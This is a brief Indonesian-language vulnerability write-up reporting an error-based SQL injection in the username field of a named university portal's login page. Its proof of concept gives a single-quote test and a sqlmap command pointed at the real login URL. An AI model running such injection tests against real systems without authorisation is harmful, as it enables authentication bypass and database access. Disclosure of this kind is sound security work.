# Write-up: Error-Based SQL Injection on ISDM Portal

## Description
Ditemukan celah keamanan SQL Injection pada parameter `username` di halaman login `isdm.usm.ac.id`. Celah ini memungkinkan penyerang untuk memanipulasi query database dan melewati proses autentikasi.

## Proof of Concept (PoC)
1. **Payload Manual:**
   Memasukkan karakter `'` memicu error SQL yang mengungkap struktur query internal.
2. **Automated Scan:**
   Menggunakan `sqlmap` untuk verifikasi dampak:
   ```bash
   sqlmap -u "[https://isdm.usm.ac.id/app_login.php](https://isdm.usm.ac.id/app_login.php)" --data="username=admin&password=admin" -p username --banner
